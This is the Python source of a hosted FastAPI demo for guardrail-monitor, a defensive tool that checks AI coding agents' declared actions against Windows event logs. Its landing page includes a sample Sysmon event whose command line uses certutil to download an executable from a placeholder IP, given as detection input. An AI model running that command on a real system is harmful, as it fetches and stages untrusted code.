"""guardrail-monitor hosted demo: the real pipeline behind HTTP, fed sample Windows events.

    uvicorn web.app:app --host 0.0.0.0 --port $PORT

What is real: gm.monitor's funnel -- session attribution, the shipped
policy.windows.yaml, the hash-chained store, the alerts log, the heartbeat --
and every gm.server tool implementation, called here over plain HTTP instead
of MCP stdio. The Windows normalizers in gm.collectors_win parse every event.

What is not: there is no sensor. Events are sample Sysmon / Security 4663 /
PowerShell 4104 XML (web/samples.py) or XML a reviewer posts. Nothing is ever
killed: an `action: kill` verdict is recorded as enforce.simulated. The probe
suite injects the events a live sensor would emit instead of touching files,
processes or the network.

Every visitor shares one small demo log. It is reseeded on start, every
GM_DEMO_RESET_MINUTES, whenever it outgrows GM_DEMO_MAX_LOG_BYTES, and on
POST /demo/reset. Writes are rate limited per client.
"""

from __future__ import annotations

import os
import sys
import tempfile
import threading
import time
import xml.etree.ElementTree as ET
from contextlib import asynccontextmanager
from dataclasses import dataclass
from pathlib import Path
from typing import List, Literal, Optional

import defusedxml.ElementTree as SafeET
from defusedxml import DefusedXmlException
from fastapi import Depends, FastAPI, HTTPException, Query, Request
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel, Field

import gm
from gm import server
from gm.collectors import IngestServer
from gm.collectors_win import powershell_normalize, security_normalize, sysmon_normalize
from gm.config import REPO_ROOT, Settings
from gm.monitor import KILL_SIGNAL, Collector, Monitor
from gm.probes import DEFAULT_PROBES, Probe, run_suite

from . import samples

MAX_XML_BYTES = 64 * 1024
MAX_BODY_BYTES = 256 * 1024
NS = {"e": samples.NS}
NORMALIZERS = {
    samples.SYSMON: sysmon_normalize,
    samples.SECURITY: security_normalize,
    samples.POWERSHELL: powershell_normalize,
}
DEMO_FILES = ("events.jsonl", "events.jsonl.lock", "alerts.jsonl", "status.json", "status.json.tmp")


def _stderr(msg: str) -> None:
    print(msg, file=sys.stderr, flush=True)


# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

@dataclass
class DemoConfig:
    demo_dir: str
    policy: str
    reset_minutes: float = 30.0
    max_log_bytes: int = 2_000_000
    rate_limit_per_minute: int = 30
    heartbeat_seconds: float = 5.0

    @classmethod
    def from_env(cls) -> "DemoConfig":
        env = os.environ
        return cls(
            demo_dir=env.get("GM_DEMO_DIR") or os.path.join(tempfile.gettempdir(), "gm-demo"),
            policy=env.get("GM_DEMO_POLICY") or str(REPO_ROOT / "policy.windows.yaml"),
            reset_minutes=float(env.get("GM_DEMO_RESET_MINUTES", "30")),
            max_log_bytes=int(env.get("GM_DEMO_MAX_LOG_BYTES", "2000000")),
            rate_limit_per_minute=int(env.get("GM_DEMO_RATE_LIMIT", "30")),
            heartbeat_seconds=float(env.get("GM_DEMO_HEARTBEAT_SECONDS", "5")),
        )


class DemoInputError(Exception):
    def __init__(self, status: int, detail: str):
        super().__init__(detail)
        self.status = status
        self.detail = detail


# ---------------------------------------------------------------------------
# The monitor, minus anything that could hurt the host
# ---------------------------------------------------------------------------

class DemoMonitor(Monitor):
    def _enforce_kill(self, rec: dict) -> None:
        # A public endpoint that accepts arbitrary events must not be able to
        # make this process signal anything -- ProcessId=1 is this container's
        # web server. Record what a real monitor would have done.
        self.store.append(src="gm", kind="enforce.simulated", session=rec["session"],
                          pid=rec["pid"],
                          data={"would_signal": int(KILL_SIGNAL), "reason_seq": rec["seq"],
                                "note": "hosted demo: enforcement is recorded, never executed"})


class _ReplayFeed(object):
    """Stands in for a collector thread. Not kernel-level, and reported as such."""

    name = "demo-replay"

    def is_alive(self) -> bool:
        return True

    def start(self) -> None:
        pass

    def stop(self) -> None:
        pass


def normalize_xml(xml: str) -> list:
    """Parse a rendered Windows event safely and normalize it with the real code."""
    if len(xml.encode("utf-8")) > MAX_XML_BYTES:
        raise DemoInputError(413, "event XML is larger than %d bytes" % MAX_XML_BYTES)
    try:
        # defusedxml first: gm.collectors_win uses the stdlib parser, which is
        # fine for events the OS renders and not for XML from the internet.
        root = SafeET.fromstring(xml, forbid_dtd=True)
    except DefusedXmlException:
        raise DemoInputError(400, "DTDs, entities and external references are not accepted")
    except ET.ParseError as exc:
        raise DemoInputError(400, "not well-formed XML: %s" % exc)
    channel = root.findtext("e:System/e:Channel", namespaces=NS)
    normalizer = NORMALIZERS.get(channel or "")
    if normalizer is None:
        raise DemoInputError(422, "unsupported channel %r; supported: %s"
                             % (channel, sorted(NORMALIZERS)))
    try:
        events = list(normalizer(xml))
    except Exception as exc:
        raise DemoInputError(400, "the %s normalizer rejected this event: %r" % (channel, exc))
    if not events:
        raise DemoInputError(422, "no canonical event produced: %s maps event ids %s "
                             "(Security 4663 also needs ObjectName and AccessMask)"
                             % (channel, samples.SUPPORTED[channel]))
    return events


def to_canonical(step: dict) -> list:
    if step["type"] == "hook":
        return [IngestServer._to_canonical(step["payload"])]
    return normalize_xml(step["xml"])


class DemoState(object):
    def __init__(self, cfg: DemoConfig):
        self.cfg = cfg
        self.lock = threading.RLock()
        self.monitor: Optional[DemoMonitor] = None
        self.seeded_at = 0.0
        self.resets = 0
        self._stopping = threading.Event()
        self._beat: Optional[threading.Thread] = None
        self._hits: dict = {}
        self._hits_lock = threading.Lock()

    # --- lifecycle ----------------------------------------------------------

    def settings(self) -> Settings:
        d = Path(self.cfg.demo_dir)
        return Settings(log=str(d / "events.jsonl"), policy=self.cfg.policy,
                        sock=str(d / "ingest.sock"), alert_log=str(d / "alerts.jsonl"),
                        status=str(d / "status.json"),
                        status_interval=self.cfg.heartbeat_seconds)

    def start(self) -> None:
        self.reset()
        self._stopping.clear()
        self._beat = threading.Thread(target=self._heartbeat, name="gm-demo-heartbeat",
                                      daemon=True)
        self._beat.start()

    def shutdown(self) -> None:
        self._stopping.set()
        if self._beat is not None:
            self._beat.join(10)
        with self.lock:
            self._close()

    def _close(self) -> None:
        if self.monitor is not None:
            self.monitor.store.close()
        ctx = getattr(server, "_ctx", None)
        if ctx is not None:
            ctx.store.close()

    def _heartbeat(self) -> None:
        while not self._stopping.wait(self.cfg.heartbeat_seconds):
            try:
                with self.lock:
                    self.monitor.check_health()
            except Exception as exc:
                _stderr("[gm-demo] ERROR heartbeat: %r" % (exc,))

    def reset(self) -> None:
        """Start over from the sample scenarios. Deletes only the demo's own files."""
        with self.lock:
            self._close()
            d = Path(self.cfg.demo_dir)
            d.mkdir(parents=True, exist_ok=True)
            for name in DEMO_FILES:
                try:
                    (d / name).unlink()
                except FileNotFoundError:
                    pass
            s = self.settings()
            self.monitor = DemoMonitor.from_settings(s)
            self.monitor.collectors.append(Collector("demo-replay", _ReplayFeed(), kernel=False))
            server.configure(s)
            for scenario in samples.SCENARIOS:
                self.ingest_steps(scenario["steps"])
            self.monitor.check_health()
            self.seeded_at = time.time()
            self.resets += 1

    def refresh_if_needed(self) -> Optional[str]:
        with self.lock:
            reason = None
            if time.time() - self.seeded_at > self.cfg.reset_minutes * 60:
                reason = "stale"
            else:
                try:
                    if os.path.getsize(self.settings().log) > self.cfg.max_log_bytes:
                        reason = "size"
                except OSError:
                    pass
            if reason:
                self.reset()
            return reason

    # --- ingest ---------------------------------------------------------------

    def _tip(self) -> int:
        seq = 0
        for rec in self.monitor.store.scan():
            seq = rec["seq"]
        return seq

    def ingest_events(self, events: list) -> list:
        with self.lock:
            before = self._tip()
            for ev in events:
                self.monitor.ingest(ev)
            return [r for r in self.monitor.store.scan() if r["seq"] > before]

    def ingest_steps(self, steps: list) -> list:
        events = []
        for step in steps:
            events.extend(to_canonical(step))
        return self.ingest_events(events)

    # --- probes ----------------------------------------------------------------

    def probe_suite(self, collector_alive: bool) -> dict:
        with self.lock:
            canary = self.monitor.policy.vars.get("canary_dir", samples.HOME + "\\.gm-canaries")
            injected = samples.probe_events(canary)

            def action_for(probe_id):
                def act(_canary_dir):
                    if collector_alive and probe_id in injected:
                        for ev in normalize_xml(injected[probe_id]):
                            self.monitor.ingest(ev)
                return act

            probes = [Probe(p.id, p.expects_rule, p.description, lambda _d: None, action_for(p.id))
                      for p in DEFAULT_PROBES]
            result = run_suite(self.monitor.store, canary, probes=probes, settle=0.0)
        result["simulated"] = True
        result["collector"] = "live" if collector_alive else "dead"
        result["demo_note"] = ("Hosted demo: each probe injects the event a live sensor would "
                               "emit (collector=live) or nothing at all (collector=dead). No "
                               "file, process or network action is performed.")
        result["monitor"] = server.control_coverage(days=1)["monitor"]
        return result

    # --- rate limiting -----------------------------------------------------------

    def allow(self, client: str) -> bool:
        now = time.time()
        with self._hits_lock:
            window = [t for t in self._hits.get(client, ()) if now - t < 60.0]
            allowed = len(window) < self.cfg.rate_limit_per_minute
            if allowed:
                window.append(now)
            self._hits[client] = window
            if len(self._hits) > 10000:
                self._hits = {k: v for k, v in self._hits.items() if v and now - v[-1] < 60.0}
            return allowed


def _shape(records: list) -> dict:
    return {
        "count": len(records),
        "violations": sorted({v["rule"] for r in records for v in r["verdicts"]
                              if v["verdict"] != "allow"}),
        "enforcement": [r for r in records if r["kind"].startswith("enforce.")],
        "records": records,
    }


# ---------------------------------------------------------------------------
# Request models
# ---------------------------------------------------------------------------

class WindowsEvent(BaseModel):
    xml: str = Field(..., description="One rendered event: Sysmon (ids %s), Security 4663, or "
                                      "PowerShell 4104." % samples.SUPPORTED[samples.SYSMON],
                     examples=[samples.EXAMPLE_EVENT])


class HookEvent(BaseModel):
    hook_event_name: Literal["PreToolUse", "PostToolUse"] = "PreToolUse"
    session_id: str = Field(..., min_length=1, max_length=128, examples=["my-session"])
    tool_name: str = Field(..., min_length=1, max_length=64, examples=["Bash"])
    tool_input: dict = Field(default_factory=dict, examples=[{"command": "python build.py"}])
    cwd: Optional[str] = Field(None, max_length=1024, examples=[samples.WORKSPACE])
    agent_pid: int = Field(..., ge=1, le=4194304, examples=[42000])


DESCRIPTION = """
**Sample data, real pipeline.** Every endpoint under `/api` is the implementation
of the MCP tool of the same name in `gm/server.py`, reading the log that
`gm/monitor.py` writes. Events are sample Sysmon, Security 4663 and PowerShell 4104
XML run through the real normalizers and the shipped `policy.windows.yaml`.

* There is **no live sensor** here: `control_coverage` honestly reports no
  kernel-level collector.
* `action: kill` is **never executed**; it is recorded as `enforce.simulated`.
* `run_probe_suite` is **simulated**: `collector=live` injects what a sensor would
  emit, `collector=dead` injects nothing.
* The demo log is **shared** and reseeded on start, every 30 minutes, when it grows
  too large, or on `POST /demo/reset`. Writes are rate limited.
* Sample sessions have no live process, so `list_sessions` needs `include_dead=true`.

Source: https://github.com/chakram-dev-ai/mcp-system-reliability-guardrail
"""


# ---------------------------------------------------------------------------
# App
# ---------------------------------------------------------------------------

def create_app(config: Optional[DemoConfig] = None) -> FastAPI:
    cfg = config or DemoConfig.from_env()
    state = DemoState(cfg)

    @asynccontextmanager
    async def lifespan(app: FastAPI):
        state.start()
        try:
            yield
        finally:
            state.shutdown()

    app = FastAPI(title="guardrail-monitor hosted demo", version=gm.__version__,
                  description=DESCRIPTION, lifespan=lifespan)
    app.state.demo = state

    @app.middleware("http")
    async def cap_body(request: Request, call_next):
        length = request.headers.get("content-length")
        if length and length.isdigit() and int(length) > MAX_BODY_BYTES:
            return JSONResponse({"detail": "request body larger than %d bytes" % MAX_BODY_BYTES},
                                status_code=413)
        return await call_next(request)

    def fresh() -> None:
        state.refresh_if_needed()

    def limited(request: Request) -> None:
        client = request.client.host if request.client else "unknown"
        if not state.allow(client):
            raise HTTPException(429, "rate limit: %d writes per minute per client"
                                % cfg.rate_limit_per_minute, headers={"Retry-After": "60"})

    def run_input(fn):
        try:
            return fn()
        except DemoInputError as exc:
            raise HTTPException(exc.status, exc.detail)

    read = [Depends(fresh)]
    write = [Depends(fresh), Depends(limited)]

    # --- meta ---------------------------------------------------------------

    @app.get("/healthz", tags=["meta"])
    def healthz():
        return {"status": "ok", "version": gm.__version__}

    @app.get("/", response_class=HTMLResponse, include_in_schema=False)
    def landing(request: Request):
        return HTMLResponse(_landing_html(str(request.base_url).rstrip("/")))

    @app.get("/api", tags=["meta"], dependencies=read)
    def api_index():
        return {
            "demo": True,
            "docs": "/docs",
            "tools": {
                "query_events": "GET /api/query_events",
                "list_violations": "GET /api/list_violations",
                "session_summary": "GET /api/session_summary/{session}",
                "find_blind_spots": "GET /api/find_blind_spots/{session}",
                "verify_log_integrity": "GET /api/verify_log_integrity",
                "run_probe_suite": "POST /api/run_probe_suite?collector=live|dead",
                "control_coverage": "GET /api/control_coverage",
                "list_sessions": "GET /api/list_sessions?include_dead=true",
                "list_agents": "GET /api/list_agents",
                "attribution_health": "GET /api/attribution_health",
            },
            "demo_endpoints": {
                "scenarios": "GET /demo/scenarios",
                "replay": "POST /demo/scenarios/{name}",
                "windows_event": "POST /demo/windows-event",
                "hook_event": "POST /demo/hook",
                "alerts": "GET /demo/alerts",
                "reset": "POST /demo/reset",
            },
            "sessions": [s["session"] for s in samples.SCENARIOS if s["session"]],
            "seeded_at": state.seeded_at,
        }

    # --- the MCP tools, over HTTP ---------------------------------------------

    @app.get("/api/query_events", tags=["tools"], dependencies=read)
    def query_events(session: Optional[str] = None,
                     kinds: Optional[List[str]] = Query(None),
                     minutes: int = Query(60, ge=1, le=10080),
                     only_flagged: bool = False,
                     limit: int = Query(100, ge=1, le=500)):
        return server.query_events(session=session, kinds=kinds, minutes=minutes,
                                   only_flagged=only_flagged, limit=limit)

    @app.get("/api/list_violations", tags=["tools"], dependencies=read)
    def list_violations(session: Optional[str] = None,
                        minutes: int = Query(1440, ge=1, le=10080),
                        min_severity: Literal["low", "medium", "high", "critical"] = "medium"):
        return server.list_violations(session=session, minutes=minutes, min_severity=min_severity)

    @app.get("/api/session_summary/{session}", tags=["tools"], dependencies=read)
    def session_summary(session: str, minutes: int = Query(1440, ge=1, le=10080)):
        return server.session_summary(session, minutes=minutes)

    @app.get("/api/find_blind_spots/{session}", tags=["tools"], dependencies=read)
    def find_blind_spots(session: str, minutes: int = Query(1440, ge=1, le=10080),
                         window_seconds: float = Query(30.0, ge=1.0, le=3600.0)):
        return server.find_blind_spots(session, minutes=minutes, window_seconds=window_seconds)

    @app.get("/api/verify_log_integrity", tags=["tools"], dependencies=read)
    def verify_log_integrity():
        return server.verify_log_integrity()

    @app.post("/api/run_probe_suite", tags=["tools"], dependencies=write)
    def run_probe_suite(collector: Literal["live", "dead"] = "live"):
        return state.probe_suite(collector_alive=collector == "live")

    @app.get("/api/control_coverage", tags=["tools"], dependencies=read)
    def control_coverage(days: int = Query(7, ge=1, le=30)):
        return server.control_coverage(days=days)

    @app.get("/api/list_sessions", tags=["tools"], dependencies=read)
    def list_sessions(include_dead: bool = False):
        return server.list_sessions(include_dead=include_dead)

    @app.get("/api/list_agents", tags=["tools"], dependencies=read)
    def list_agents():
        return server.list_agents()

    @app.get("/api/attribution_health", tags=["tools"], dependencies=read)
    def attribution_health(minutes: int = Query(60, ge=1, le=10080)):
        return server.attribution_health(minutes=minutes)

    # --- demo controls -----------------------------------------------------------

    @app.get("/demo/scenarios", tags=["demo"], dependencies=read)
    def scenarios():
        return {"scenarios": samples.SCENARIOS}

    @app.post("/demo/scenarios/{name}", tags=["demo"], dependencies=write)
    def replay(name: str):
        scenario = samples.SCENARIOS_BY_NAME.get(name)
        if scenario is None:
            raise HTTPException(404, "unknown scenario %r; see GET /demo/scenarios" % name)
        out = _shape(run_input(lambda: state.ingest_steps(scenario["steps"])))
        out["scenario"] = name
        out["expect"] = scenario["expect"]
        return out

    @app.post("/demo/windows-event", tags=["demo"], dependencies=write)
    def windows_event(body: WindowsEvent):
        return _shape(run_input(lambda: state.ingest_events(normalize_xml(body.xml))))

    @app.post("/demo/hook", tags=["demo"], dependencies=write)
    def hook_event(body: HookEvent):
        payload = body.model_dump()
        payload["hook_pid"] = payload["agent_pid"] + 900
        return _shape(state.ingest_events([IngestServer._to_canonical(payload)]))

    @app.get("/demo/alerts", tags=["demo"], dependencies=read)
    def alerts(limit: int = Query(50, ge=1, le=500)):
        import json
        path = state.settings().alert_log
        try:
            with open(path, encoding="utf-8") as fh:
                lines = [l for l in fh if l.strip()]
        except FileNotFoundError:
            lines = []
        return {"count": len(lines), "alerts": [json.loads(l) for l in lines[-limit:]]}

    @app.post("/demo/reset", tags=["demo"], dependencies=[Depends(limited)])
    def reset():
        state.reset()
        return {"reset": True, "seeded_at": state.seeded_at,
                "events": len(list(state.monitor.store.scan()))}

    return app


def _landing_html(base: str) -> str:
    rows = "".join(
        "<tr><td><code>%s</code></td><td>%s</td></tr>" % (s["name"], s["title"])
        for s in samples.SCENARIOS)
    return _LANDING.replace("{{BASE}}", base).replace("{{ROWS}}", rows).replace(
        "{{VERSION}}", gm.__version__)


_LANDING = """<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>guardrail-monitor hosted demo</title>
<style>
:root { --fg:#1d1d1f; --muted:#5f6368; --bg:#fafaf8; --line:#e3e3df; --accent:#0b57d0; --code:#f1f1ee; }
@media (prefers-color-scheme: dark) { :root { --fg:#e8e8e6; --muted:#a0a09c; --bg:#161615; --line:#33332f; --accent:#8ab4f8; --code:#22221f; } }
body { margin:0; font:15px/1.55 system-ui, -apple-system, "Segoe UI", sans-serif; color:var(--fg); background:var(--bg); }
main { max-width:860px; margin:0 auto; padding:40px 20px 60px; }
h1 { font-size:26px; margin:0 0 6px; } h2 { font-size:18px; margin:32px 0 8px; }
p.lede { color:var(--muted); margin:0 0 20px; }
a { color:var(--accent); }
code, pre { font-family:ui-monospace, SFMono-Regular, Consolas, monospace; font-size:13px; background:var(--code); border-radius:4px; }
code { padding:1px 5px; } pre { padding:12px 14px; overflow-x:auto; }
table { border-collapse:collapse; width:100%; } td { border-top:1px solid var(--line); padding:7px 8px 7px 0; vertical-align:top; }
.note { border-left:3px solid var(--accent); padding:4px 12px; color:var(--muted); }
</style></head><body><main>
<h1>guardrail-monitor &mdash; hosted demo</h1>
<p class="lede">Checks that the guardrails around an AI coding agent actually work, by diffing what the agent's hooks declared against what the OS observed. v{{VERSION}}</p>
<p class="note">Sample data, real pipeline. Events are sample Sysmon / Security 4663 / PowerShell 4104 XML run through the real normalizers, policy engine, hash-chained log and MCP tool implementations. There is no live sensor, kills are simulated, and the shared demo log resets every 30 minutes.</p>

<h2>Try it</h2>
<p><a href="{{BASE}}/docs">Interactive API docs (Swagger)</a> &middot; <a href="{{BASE}}/api">API index</a> &middot; <a href="https://github.com/chakram-dev-ai/mcp-system-reliability-guardrail">Source</a></p>
<pre>curl {{BASE}}/api/list_violations
curl {{BASE}}/api/find_blind_spots/demo-cred
curl {{BASE}}/api/control_coverage
curl -X POST "{{BASE}}/api/run_probe_suite?collector=dead"
curl -X POST {{BASE}}/demo/scenarios/undeclared-credential-read</pre>

<h2>Seeded scenarios</h2>
<table>{{ROWS}}</table>

<h2>Send your own event</h2>
<pre>curl -X POST {{BASE}}/demo/windows-event -H "Content-Type: application/json" \\
  -d '{"xml": "&lt;Event xmlns=\\"http://schemas.microsoft.com/win/2004/08/events/event\\"&gt;&lt;System&gt;&lt;EventID&gt;1&lt;/EventID&gt;&lt;Channel&gt;Microsoft-Windows-Sysmon/Operational&lt;/Channel&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name=\\"ProcessId\\"&gt;41501&lt;/Data&gt;&lt;Data Name=\\"Image\\"&gt;C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\certutil.exe&lt;/Data&gt;&lt;Data Name=\\"CommandLine\\"&gt;certutil -urlcache -f http://203.0.113.7/x.exe&lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;"}'</pre>
</main></body></html>
"""


app = create_app()
